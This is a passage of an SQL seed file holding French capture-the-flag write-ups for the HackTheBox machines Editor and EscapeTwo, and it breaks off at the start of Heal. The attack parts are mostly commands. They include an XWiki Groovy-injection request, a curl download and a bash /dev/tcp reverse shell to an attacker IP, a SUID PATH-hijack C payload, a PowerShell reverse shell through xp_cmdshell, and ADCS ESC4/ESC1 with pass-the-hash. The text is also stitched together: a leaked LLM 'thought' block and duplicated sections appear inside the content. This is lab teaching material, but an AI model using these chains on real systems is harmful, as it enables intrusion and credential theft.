*   **Port 8080 (HTTP)** : Jetty 10.0.20, hébergeant une instance **XWiki**.

### 2. Énumération Web & Virtual Hosting

Le serveur utilise le **Virtual Hosting**. Je procède à une recherche de sous-domaines via **ffuf** pour découvrir d''éventuels services cachés.

```bash
ffuf -u http://10.10.11.80 -H "Host: FUZZ.editor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Le fuzzing identifie le sous-domaine `wiki.editor.htb`. J''ajoute les entrées à mon fichier `/etc/hosts` :
`10.10.11.80 editor.htb wiki.editor.htb`

L''analyse du site principal (`editor.htb`) montre une application **React** statique servant de vitrine pour un éditeur de code. Le répertoire `/assets` est énuméré avec **feroxbuster**, mais ne révèle aucun vecteur d''attaque immédiat.

```bash
feroxbuster -u http://editor.htb -x html,js,txt
```

### 3. Analyse de la Surface d''Attaque (XWiki)

Je concentre mon attention sur `wiki.editor.htb` (port 8080). Le footer indique la version : **XWiki Debian 15.10.8**. 

> **Schéma Mental :**
> Identification de version (XWiki 15.10.8) -> Recherche de vulnérabilités connues (CVE) -> Focus sur les vulnérabilités de type **Remote Code Execution (RCE)** non-authentifiées -> Découverte de la **CVE-2025-24893**.

La **CVE-2025-24893** est une vulnérabilité critique permettant une **Groovy Script Injection** via le composant `SolrSearch`. Un attaquant non-authentifié peut injecter du code arbitraire dans le paramètre `text` si le paramètre `media=rss` est présent.

### 4. Exploitation de la CVE-2025-24893

Le **Proof of Concept (PoC)** consiste à injecter une directive `{{groovy}}` dans la requête de recherche. Le moteur de template de XWiki interprète alors le script côté serveur.

**Test de vulnérabilité (RCE Check) :**
J''utilise le payload suivant pour confirmer l''exécution de code en calculant une opération arithmétique :
`}}}{{async async=false}}{{groovy}}println("Exploit-Test:" + (20+22)){{/groovy}}{{/async}}`

Une fois encodé en **URL-encoded** et envoyé via **Burp Suite** :
```http
GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22Exploit-Test%3A%22%20%2B%20(20%2B22))%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D HTTP/1.1
Host: wiki.editor.htb
```
La réponse contient `Exploit-Test:42`, confirmant la **RCE**.

### 5. Établissement du Premier Shell

L''exécution directe de commandes via `java.lang.Runtime` ou les pipes Bash (`|`) échoue souvent dans les environnements Java/Groovy à cause de la gestion des flux. Je contourne cette restriction en téléchargeant un script de **Reverse Shell** sur la cible.

**Payload Groovy pour l''exécution :**
`"id".execute().text` (pour vérification)
`"curl http://10.10.14.6/rev.sh -o /dev/shm/rev.sh".execute()` (pour le drop)

**Étapes de l''attaque :**
1.  Préparation du script `rev.sh` localement :
    ```bash
    #!/bin/bash
    bash -i >& /dev/tcp/10.10.14.6/443 0>&1
    ```
2.  Lancement d''un serveur HTTP Python : `python3 -m http.server 80`.
3.  Injection du payload pour télécharger le script dans `/dev/shm` (répertoire en mémoire, souvent accessible en écriture).
4.  Exécution du script via Groovy :
    `"bash /dev/shm/rev.sh".execute()`

**Capture du Shell :**
```bash
# Sur ma machine d''attaque
nc -lnvp 443

# Connexion reçue
xwiki@editor:/usr/lib/xwiki-jetty$ id
uid=1001(xwiki) gid=1001(xwiki) groups=1001(xwiki)
```

Je stabilise immédiatement mon shell pour obtenir un **TTY** complet :
```bash
script /dev/null -c bash
# CTRL+Z
stty raw -echo; fg
reset
export TERM=xterm
```

---

### Énumération Post-Exploitation & Pivot vers l''utilisateur

Une fois l''accès initial obtenu en tant qu''utilisateur **xwiki**, ma priorité est d''identifier des vecteurs de mouvement latéral. L''énumération du système de fichiers et des fichiers de configuration est cruciale dans un environnement **Java/XWiki**.

#### Énumération des utilisateurs et configurations
L''examen du répertoire `/home` révèle l''existence d''un utilisateur nommé **oliver**. Pour trouver des vecteurs de pivot, je fouille les fichiers de configuration de l''application **XWiki** situés dans `/etc/xwiki`.

Le fichier **hibernate.cfg.xml** est particulièrement critique car il contient les paramètres de connexion à la base de données via l''**ORM Hibernate**.

```bash
# Recherche de credentials dans la configuration Hibernate
cat /etc/xwiki/hibernate.cfg.xml | grep -A 5 "connection.password"
```

J''y découvre les identifiants suivants :
*   **Username** : `xwiki`
*   **Password** : `theEd1t0rTeam99`

#### Mouvement Latéral : Password Reuse
Dans de nombreux environnements, les administrateurs réutilisent les mots de passe de service pour leurs comptes personnels. Je teste ce mot de passe contre le service **SSH** pour l''utilisateur **oliver**.

```bash
# Vérification du Password Reuse avec NetExec
netexec ssh 10.10.11.80 -u oliver -p theEd1t0rTeam99
# Connexion SSH
sshpass -p theEd1t0rTeam99 ssh oliver@editor.htb
```

> **Schéma Mental : Pivot via Database Credentials**
> 1. **Extraction** : Lecture des fichiers de configuration applicatifs (Hibernate XML).
> 2. **Hypothèse** : Le mot de passe de la base de données est partagé par l''administrateur système.
> 3. **Validation** : Tentative d''authentification SSH sur le compte `oliver`.
> 4. **Résultat** : Accès SSH établi, transition de l''utilisateur de service vers un utilisateur physique.

---

### Escalade de Privilèges : De oliver à root

En tant qu''**oliver**, je procède à une énumération des services réseaux internes et des binaires avec des permissions spéciales.

#### Énumération des services locaux
L''utilisation de `ss` révèle plusieurs ports écoutant uniquement sur l''interface de **Loopback** (127.0.0.1).

```bash
# Identification des services locaux
ss -tnl
```

Le port **19999** attire mon attention. Après avoir mis en place un **SSH Tunneling** (Local Port Forwarding), je découvre qu''il s''agit d''une instance de **Netdata**, un outil de monitoring.

```bash
# Tunneling SSH pour accéder au dashboard Netdata
ssh -L 19999:localhost:19999 oliver@editor.htb
```

#### Analyse de la vulnérabilité Netdata (CVE-2024-32019)
La version installée est la **1.45.2**. Cette version spécifique contient un binaire **SetUID** vulnérable nommé `ndsudo`.

```bash
# Vérification de la version et des permissions
/opt/netdata/bin/netdata -W buildinfo | grep Version
ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

Le binaire `ndsudo` possède le **SUID bit** (propriété de root). Son rôle est d''exécuter certaines commandes privilégiées (comme `nvme-list`). Cependant, il est vulnérable à une **PATH Injection** car il ne définit pas de chemin absolu pour les exécutables qu''il appelle.

#### Exploitation : SUID PATH Hijacking
La logique de l''attaque consiste à créer un faux binaire nommé `nvme` dans un répertoire contrôlé, puis à modifier la variable d''environnement **PATH** pour forcer `ndsudo` à exécuter mon code avec les privilèges **root**.

**Payload C (root.c) :**
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/root_shell; chmod +s /tmp/root_shell");
    return 0;
}
```

**Chaîne d''exécution :**
```bash
# Compilation et préparation
gcc root.c -o nvme
chmod +x nvme

# Injection du PATH et déclenchement via ndsudo
export PATH=/dev/shm:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

# Accès final
/tmp/root_shell -p
```

> **Schéma Mental : SUID PATH Injection**
> 1. **Identification** : Un binaire SUID (`ndsudo`) appelle des commandes externes (`nvme`).
> 2. **Faiblesse** : Le binaire utilise le **PATH** de l''utilisateur pour localiser l''exécutable au lieu d''un chemin statique (`/usr/bin/nvme`).
> 3. **Manipulation** : Création d''un binaire malveillant portant le même nom dans `/dev/shm`.
> 4. **Exécution** : En plaçant `/dev/shm` au début du **PATH**, `ndsudo` (tournant en root) exécute le faux binaire, nous octroyant un shell privilégié.

---

### Phase 3 : Élévation de Privilèges & Domination

#### Pivot vers l''utilisateur oliver

Après avoir obtenu un accès initial en tant qu''utilisateur `xwiki`, j''énumère les fichiers de configuration pour identifier des vecteurs de pivot. Le fichier **Hibernate** (`/etc/xwiki/hibernate.cfg.xml`), qui gère l''**Object-Relational Mapping** pour la base de données **MySQL**, contient des identifiants en clair.

```bash
# Extraction des credentials de la base de données
grep -A 1 "hibernate.connection.password" /etc/xwiki/hibernate.cfg.xml
# Résultat : <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

Je teste la réutilisation de ce mot de passe pour l''utilisateur `oliver` via **SSH**. Le succès de l''authentification confirme une politique de mot de passe faible (Password Reuse).

```bash
ssh oliver@editor.htb # Password: theEd1t0rTeam99
```

---

#### Élévation de Privilèges (Root)

L''énumération des services locaux via `ss -tnl` révèle un service écoutant sur le port **19999**. Après avoir établi un **SSH Tunneling** (Local Port Forwarding), j''identifie une instance de **NetData** en version **1.45.2**.

> **Schéma Mental : Exploitation de ndsudo (CVE-2024-32019)**
> 1. **Constat** : Le binaire `ndsudo` possède le bit **SUID** (Root) pour permettre à NetData d''exécuter des commandes de diagnostic.
> 2. **Vulnérabilité** : Le binaire appelle des utilitaires système (ex: `nvme`) sans utiliser de **Absolute Path**.
> 3. **Vecteur** : En modifiant la variable d''environnement **PATH**, je peux forcer `ndsudo` à exécuter un binaire malveillant portant le même nom que l''utilitaire légitime, mais situé dans un répertoire sous mon contrôle.
> 4. **Résultat** : Exécution de code arbitraire avec les privilèges de l''owner du binaire SUID (Root).

Je localise le binaire vulnérable :
```bash
find / -name ndsudo -ls 2>/dev/null
# /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo (SUID Root)
```

Je prépare un exploit en **C** pour copier `/bin/bash` avec les permissions **SUID** dans `/tmp`, garantissant un accès persistant.

```c
// root.c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    return 0;
}
```

Je compile l''exploit, je le nomme `nvme` (une commande autorisée par `ndsudo`) et j''injecte mon répertoire actuel dans le **PATH** lors de l''exécution.

```bash
# Compilation et préparation
gcc root.c -o nvme
chmod +x nvme

# Exploitation via PATH Injection
PATH=/dev/shm:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

# Accès Root
/tmp/rootbash -p
```

---

#### Analyse Post-Exploitation : Beyond Root

Un comportement atypique a été observé durant la phase de pivot : l''impossibilité d''utiliser la commande `su` depuis l''utilisateur `xwiki`, même avec le mot de passe correct. L''analyse du fichier d''unité **systemd** (`/lib/systemd/system/xwiki.service`) explique ce mécanisme de durcissement.

```ini
[Service]
User=xwiki
Group=xwiki
NoNewPrivileges=true
ProtectSystem=strict
```

La directive **NoNewPrivileges=true** est une mesure de sécurité critique au niveau du noyau (**kernel**). Lorsqu''elle est activée, le flag `PR_SET_NO_NEW_PRIVS` est positionné pour le processus et tous ses enfants. Cela empêche toute opération `execve()` d''accorder de nouveaux privilèges, rendant les binaires **SUID** (comme `su` ou `sudo`) inopérants, car le noyau refuse d''élever les privilèges du processus lors de l''exécution, même si le bit SUID est présent sur le fichier. C''est une excellente défense contre les escalades de privilèges locales via des binaires système mal configurés.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'Ma méthodologie débute par une phase de **Port Scanning** agressive pour identifier la surface d''exposition. J''utilise **nmap** en deux passes : une détection rapide de tous les ports TCP, suivie d''une énumération précise des services. Le scan révèle...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-editor-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: EscapeTwo
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: EscapeTwo',
  'htb-escapetwo',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance & Scanning

La phase initiale repose sur une approche **Assume Breach**. Nous disposons d''un compte utilisateur de bas niveau : `rose / KxEPkKe6R8su`. L''objectif est d''énumérer la surface d''attaque pour identifier des vecteurs d''escalade ou de pivot.

#### Énumération Réseau (Nmap)
Le scan complet des ports révèle un environnement **Windows Domain Controller** classique avec une instance **MSSQL** exposée.

```bash
# Scan exhaustif des services et scripts par défaut
nmap -p- --min-rate 10000 -sCV 10.10.11.51 -oN nmap_full.txt
```

**Résultats clés :**
*   **Domain :** `sequel.htb`
*   **Hostname :** `DC01.sequel.htb`
*   **Services :** DNS (53), Kerberos (88), LDAP (389/636), SMB (445), **MSSQL (1433)**, WinRM (5985).

#### Validation des Identifiants
Utilisation de **NetExec (nxc)** pour vérifier la validité des credentials fournis sur différents protocoles.

```bash
# Vérification SMB
nxc smb 10.10.11.51 -u rose -p ''KxEPkKe6R8su''
# Vérification MSSQL
nxc mssql 10.10.11.51 -u rose -p ''KxEPkKe6R8su''
```
Le compte est valide pour **SMB** et **MSSQL**, mais ne possède pas de droits d''accès via **WinRM**.

---

### 2. Énumération SMB & Analyse de Données

L''énumération des partages **SMB** révèle des répertoires non-standards susceptibles de contenir des informations sensibles.

```bash
nxc smb 10.10.11.51 -u rose -p ''KxEPkKe6R8su'' --shares
```

**Partages identifiés :**
*   `Users` : Contient les répertoires personnels (accès limité).
*   `Accounting Department` : Contient deux fichiers Excel : `accounting_2024.xlsx` et `accounts.xlsx`.

#### Récupération des fichiers
```bash
smbclient //10.10.11.51/Accounting\ Department -U rose%KxEPkKe6R8su -c "prompt OFF; mget *"
```

> **Schéma Mental :**
> Identifiants initiaux -> Énumération de partages réseau -> Exfiltration de documents Office -> Recherche de credentials "hardcoded" ou de fuites d''informations dans les métadonnées/contenus.

---

### 3. Analyse des Workbooks & Extraction de Secrets

Les fichiers `.xlsx` semblent corrompus et ne s''ouvrent pas avec les lecteurs standards. L''analyse via la commande `file` indique qu''il s''agit de structures **Zip archive**, ce qui est normal pour le format OOXML, mais les **Magic Bytes** sont incorrects.

#### Méthode 1 : Extraction Directe (Unzip)
Comme le format est reconnu comme un Zip malgré la corruption, nous pouvons extraire les fichiers XML internes. Le fichier `sharedStrings.xml` est particulièrement critique car il stocke toutes les chaînes de caractères uniques du tableur.

```bash
unzip accounts.xlsx -d accounts_extracted
cat accounts_extracted/xl/sharedStrings.xml | xmllint --format -
```

#### Méthode 2 : Restauration des Magic Bytes
L''en-tête des fichiers est `50 48 04 03` au lieu du standard **PK** (`50 4B 03 04`). En modifiant le deuxième octet via un **Hex Editor**, le fichier devient lisible par LibreOffice/Excel.

**Secrets extraits :**
*   `oscar : 86LxLBMgEWaKUnBG`
*   **`sa : MSSQLP@ssw0rd!`** (Compte administrateur SQL local)

---

### 4. Brèche Initiale : Exploitation MSSQL

Le compte `sa` (System Administrator) sur **MSSQL** est un vecteur critique car il permet souvent l''exécution de commandes système via la procédure stockée `xp_cmdshell`.

#### Validation du compte SA
Le compte `sa` ne fonctionne pas avec l''authentification Windows (Kerberos/NTLM), il faut utiliser l''authentification SQL locale (**Local Auth**).

```bash
nxc mssql 10.10.11.51 -u sa -p ''MSSQLP@ssw0rd!'' --local-auth
```

#### Exécution de commandes & Reverse Shell
Connexion via `mssqlclient.py` d''Impacket pour activer `xp_cmdshell` et obtenir un shell.

```bash
# Connexion
mssqlclient.py sa:MSSQLP@ssw0rd!@10.10.11.51 -db master

# Activation de xp_cmdshell (si nécessaire)
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
# Résultat : sequel\sql_svc
```

Pour obtenir un accès interactif, nous injectons un payload **PowerShell Base64** (Reverse Shell) :

```bash
# Commande d''exécution via xp_cmdshell
xp_cmdshell powershell -e <BASE64_PAYLOAD>
```

> **Schéma Mental :**
> Accès SA MSSQL -> Activation de fonctionnalités d''administration (xp_cmdshell) -> Exécution de code arbitraire (RCE) -> Pivot du service SQL vers un Shell OS (sql_svc).

Le premier accès est établi en tant que **sequel\sql_svc**.

---

### 1. Énumération Interne & Extraction de Secrets

Disposant des identifiants de l''utilisateur **rose**, j''entame une énumération des services **SMB** et **MSSQL**. L''objectif est d''identifier des vecteurs de mouvement latéral ou des fuites de données dans les partages réseau.

```bash
# Vérification des accès SMB et énumération des partages
netexec smb dc01.sequel.htb -u rose -p ''KxEPkKe6R8su'' --shares

# Connexion au service MSSQL (Authentification Windows)
mssqlclient.py -windows-auth sequel.htb/rose:KxEPkKe6R8su@dc01.sequel.htb
```

L''énumération du partage `Accounting Department` révèle deux fichiers Excel : `accounting_2024.xlsx` et `accounts.xlsx`. Ces fichiers sont corrompus et ne s''ouvrent pas nativement. L''analyse des **Magic Bytes** via un éditeur hexadécimal montre une signature incorrecte.

> **Schéma Mental : Récupération de données corrompues**
> Si un fichier Office (format OpenXML) est corrompu, il reste structurellement une archive **Zip**. On peut soit corriger le header hexadécimal (`50 4B 03 04`) pour forcer l''ouverture, soit extraire directement le contenu XML pour lire les chaînes de caractères brutes.

```bash
# Extraction des chaînes de caractères depuis le XML
unzip accounts.xlsx -d accounts/
cat accounts/xl/sharedStrings.xml | xmllint --xpath ''//*[local-name()="t"]/text()'' -
```

Cette extraction permet de récupérer le mot de passe du compte **sa** (SQL Administrator) : `MSSQLP@ssw0rd!`.

---

### 2. Foothold & Post-Exploitation (sql_svc)

Avec les privilèges **sa** sur l''instance **MSSQL**, je peux activer la procédure stockée **xp_cmdshell** pour exécuter des commandes système.

```bash
# Activation de xp_cmdshell et exécution de code
netexec mssql dc01.sequel.htb -u sa -p ''MSSQLP@ssw0rd!'' --local-auth -x ''whoami''

# Reverse Shell PowerShell (Base64 encoded)
netexec mssql dc01.sequel.htb -u sa -p ''MSSQLP@ssw0rd!'' --local-auth -x ''powershell -e <BASE64_PAYLOAD>''
```

Le shell obtenu s''exécute sous l''identité du compte de service **sequel\sql_svc**. L''énumération du système de fichiers révèle un répertoire `C:\SQL2019` contenant un fichier de configuration `sql-Configuration.INI`. Ce fichier expose un mot de passe en clair : `WqSZAF6CysDQbGb3`.

---

### 3. Mouvement Latéral vers ryan

Une attaque de **Password Spraying** interne avec ce nouveau secret confirme que le mot de passe est partagé par l''utilisateur **ryan**, qui possède des droits d''accès **WinRM**.

```bash
# Spraying du mot de passe trouvé
netexec smb dc01.sequel.htb -u ryan -p ''WqSZAF6CysDQbGb3''
netexec winrm dc01.sequel.htb -u ryan -p ''WqSZAF6CysDQbGb3''

# Connexion via Evil-WinRM
evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i dc01.sequel.htb
```

---

### 4. Escalade de Privilèges : Abus de l''ADCS (ESC4 & ESC1)

L''analyse de l''**Active Directory** via **BloodHound** indique que l''utilisateur **ryan** possède le privilège **WriteOwner** sur le compte de service **ca_svc**.

> **Schéma Mental : Chaîne d''attaque ADCS**
> 1. **Take Ownership** : Utiliser le droit `WriteOwner` pour devenir propriétaire de l''objet `ca_svc`.
> 2. **DACL Manipulation** : S''octroyer le `GenericAll` sur l''objet.
> 3. **Shadow Credentials** : Créer un certificat pour usurper l''identité de `ca_svc`.
> 4. **ESC4 Exploitation** : `ca_svc` fait partie du groupe `Cert Publishers`, lui permettant de modifier les templates de certificats.

#### Étape A : Prise de contrôle de ca_svc
J''utilise **bloodyAD** pour modifier le propriétaire et obtenir le contrôle total.

```bash
# Changement de propriétaire et ajout de droits GenericAll
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan

# Obtention du NT Hash de ca_svc via Shadow Credentials
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ''ca_svc'' -dc-ip 10.10.11.51
```

#### Étape B : Exploitation ESC4 vers ESC1
Le compte **ca_svc** peut modifier le template `DunderMifflinAuthentication`. Ce template est vulnérable à **ESC4**. Je le reconfigure pour le rendre vulnérable à **ESC1** (permettant de spécifier un **Subject Alternative Name** ou **SAN**).

```bash
# Modification du template pour activer ESC1
certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -dc-ip 10.10.11.51

# Requête d''un certificat pour l''Administrateur du domaine
certipy req -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -dc-ip 10.10.11.51
```

#### Étape C : Compromission finale
Une fois le certificat `.pfx` obtenu, je l''utilise pour authentifier la session et récupérer le hash NT de l''administrateur.

```bash
# Authentification via certificat et récupération du hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51

# Accès final via Pass-The-Hash
evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb
```

---

thought
*   Role: Cybersecurity expert (Red Team), academic/pedagogical tone.
    *   Mission: Transform raw write-up text into a structured, technical, clear Phase 3 (Elevation of Privileges & Domination).
    *   Tone: Personal ("I"), pragmatic, factual.
    *   Vocabulary: Keep technical terms in English.
    *   Formatting: Markdown, bold for key concepts/vulns/tools.
    *   Code: Compact cheatsheet-style blocks.
    *   Mental Schemas: Include "> Schéma Mental :" sections.
    *   Constraint: NO filler phrases, NO intro/outro. Direct Markdown output.
    *   Input: Raw text about "EscapeTwo" HTB machine.

    *   *Current State (End of Phase 2):* Foothold as `sql_svc` (service account for MSSQL).
    *   *Step 1: Pivot to `ryan`.*
        *   Discovery: `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` contains `SQLSVCPASSWORD="WqSZAF6CysDQbGb3"`.
        *   Action: Password spraying. Works for `ryan`.
        *   Access: WinRM as `ryan`.
    *   *Step 2: Pivot to `ca_svc`.*
        *   Discovery: Bloodhound analysis. `ryan` has `WriteOwner` over `ca_svc`.
        *   Action: Use `bloodyAD` to take ownership and grant `GenericAll`.
        *   Action: Use `certipy shadow auto` to add a **Shadow Credential** (Key Credential) and retrieve the NT hash of `ca_svc`.
    *   *Step 3: Domain Admin (Root).*
        *   Discovery: ADCS (Active Directory Certificate Services) enumeration. `ca_svc` is in `Cert Publishers`.
        *   Vulnerability: **ESC4** on the `DunderMifflinAuthentication` template.
        *   Action: Modify the template to make it vulnerable to **ESC1** (Enrollee Supplies Subject).
        *   Action: Request a certificate for `administrator@sequel.htb`.
        *   Action: Authenticate with the certificate to get the Administrator NT hash.
    *   *Step 4: Beyond Root.*
        *   Analysis of the misconfigurations (Hardcoded passwords in INI files, excessive AD permissions, ADCS misconfigurations).

    *   *Section: Pivot vers Ryan*
        *   Focus on the configuration file.
    *   *Section: Compromission de ca_svc (Shadow Credentials)*
        *   Explain the `WriteOwner` logic.
    *   *Section: Escalade ADCS (ESC4 vers ESC1)*
        *   Detail the template manipulation.
    *   *Section: Beyond Root*
        *   Post-exploitation analysis.

    *   *Technical Terms:* Domain Controller, WriteOwner, Shadow Credential, ADCS, ESC4, ESC1, GenericAll, NT hash, etc.
    *   *Formatting:* Bold for **ESC4**, **Certipy**, **bloodyAD**, etc.
    *   *Mental Schemas:* Logic flow for AD ownership and ADCS.
### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur la machine en tant que **sql_svc**, l''objectif est d''étendre la surface d''attaque au sein du domaine **sequel.htb** pour atteindre les privilèges de **Domain Admin**.

#### 1. Pivot vers l''utilisateur Ryan
L''énumération du système de fichiers révèle un répertoire inhabituel à la racine : `C:\SQL2019`. Ce dossier contient les fichiers d''installation de **SQL Server Express**. L''analyse du fichier de configuration révèle des informations critiques.

```powershell
# Lecture du fichier de configuration SQL
cat C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

Le fichier contient le paramètre `SQLSVCPASSWORD="WqSZAF6CysDQbGb3"`. Bien que ce mot de passe soit destiné à **sql_svc**, la réutilisation de mots de passe est courante. Un **Password Spraying** via **NetExec** confirme que ce secret est valide pour l''utilisateur **ryan**.

```bash
# Vérification des credentials pour Ryan
netexec winrm dc01.sequel.htb -u ryan -p WqSZAF6CysDQbGb3
```

#### 2. Abus de privilèges sur ca_svc (Shadow Credentials)
En utilisant les accès de **ryan**, une collecte de données via **BloodHound** permet d''identifier un chemin d''attaque vers le compte de service de l''Autorité de Certification (**ca_svc**).

> **Schéma Mental : Prise de contrôle d''objet AD**
> Ryan possède le droit **WriteOwner** sur **ca_svc** -> Ryan se définit comme propriétaire -> Ryan s''octroie le **GenericAll** -> Ryan injecte un **Shadow Credential** pour usurper l''identité de **ca_svc**.

L''outil **bloodyAD** est utilisé pour manipuler les descripteurs de sécurité de l''objet :

```bash
# Changement du propriétaire et attribution du contrôle total
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
bloodyAD -d sequel.htb --host 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
```

Une fois le contrôle total acquis, j''utilise **Certipy** pour configurer un **Shadow Credential**. Cette technique exploite l''attribut `msDS-KeyCredentialLink` pour obtenir un **TGT** (Ticket Granting Ticket) et extraire le **NT hash** de la cible sans changer son mot de passe.

```bash
# Attaque Shadow Credentials
certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account ''ca_svc'' -dc-ip 10.10.11.51
```
**Résultat :** NT hash pour `ca_svc` : `3b181b914e7a9d5508ea1e20bc2b7fce`

#### 3. Compromission Totale via ADCS (ESC4 & ESC1)
L''utilisateur **ca_svc** est membre du groupe **Cert Publishers**, ce qui lui confère des droits étendus sur les modèles de certificats (Templates). Une énumération avec **Certipy** identifie une vulnérabilité de type **ESC4** sur le modèle `DunderMifflinAuthentication`.

> **Schéma Mental : Escalade ADCS**
> **ESC4** (Full Control sur un Template) -> Modification du Template pour activer **ESC1** (**CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**) -> Demande d''un certificat au nom de l''Administrateur -> Authentification PKINIT pour récupérer le hash de l''Admin.

L''exploitation se déroule en trois étapes :

**Étape A : Modification du Template (ESC4 -> ESC1)**
Je modifie la configuration du modèle pour permettre la définition d''un **Subject Alternative Name (SAN)** arbitraire.

```bash
# Modification du template (Certipy v5.0.2+)
certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```

**Étape B : Forge du certificat Administrateur**
Je sollicite un certificat en usurpant l''identité de l''administrateur du domaine.

```bash
# Requête du certificat via ESC1
certipy req -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

**Étape C : Extraction du Hash NT**
Le fichier `.pfx` obtenu permet de s''authentifier via Kerberos et de récupérer le hash final.

```bash
# Authentification et récupération du hash Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
```
**Hash final :** `7a8d4e04986afa8ed4060f75e5a0b3ff`

La compromission est finalisée par une connexion **Evil-WinRM** avec le hash récupéré (**Pass-the-Hash**).

---

### Beyond Root : Analyse Post-Exploitation

La compromission de **EscapeTwo** met en lumière plusieurs faiblesses structurelles critiques dans un environnement Active Directory :

1.  **Hardcoded Credentials & Information Leakage :** La présence d''un fichier `.INI` contenant le mot de passe en clair d''un compte de service est une erreur classique de déploiement. Ce fichier, accessible en lecture par un utilisateur standard, a servi de pivot direct vers un compte plus privilégié.
2.  **Abus de la délégation de propriété (WriteOwner) :** Le droit **WriteOwner** est souvent sous-estimé. Il permet à un attaquant de modifier le propriétaire d''un objet, et par extension, de modifier ses **DACL** pour s''octroyer un contrôle total (**GenericAll**). La surveillance des modifications de propriété d''objets sensibles est cruciale.
3.  **Infrastructures PKI non sécurisées (ADCS) :** L''attaque **ESC4** démontre que la sécurité de l''AD dépend directement de la sécurité de ses services de certificats. Accorder le **Full Control** sur des modèles de certificats à des groupes comme **Cert Publishers** (souvent peuplés de comptes de service) crée un vecteur d''escalade immédiat vers le rang de **Domain Admin**.
4.  **Shadow Credentials :** Cette méthode d''attaque moderne montre que la possession de droits d''écriture sur un objet utilisateur suffit à compromettre le compte sans interaction directe avec les mots de passe, rendant la détection plus complexe si les attributs `msDS-KeyCredentialLink` ne sont pas monitorés.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Kerberos', 'SQL', 'Privilege Escalation'],
  'La phase initiale repose sur une approche **Assume Breach**. Nous disposons d''un compte utilisateur de bas niveau : `rose / KxEPkKe6R8su`. L''objectif est d''énumérer la surface d''attaque pour identifier des vecteurs d''escalade ou de pivot. Le scan com...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-escapetwo-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Heal
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Heal',
  'htb-heal',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance & Énumération des Services

Ma phase de reconnaissance commence par un scan **Nmap** classique pour identifier les ports ouverts et les services associés.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.46

# Scan de détection de services et scripts par défaut
nmap -p 22,80 -sCV 10.10.11.46
```

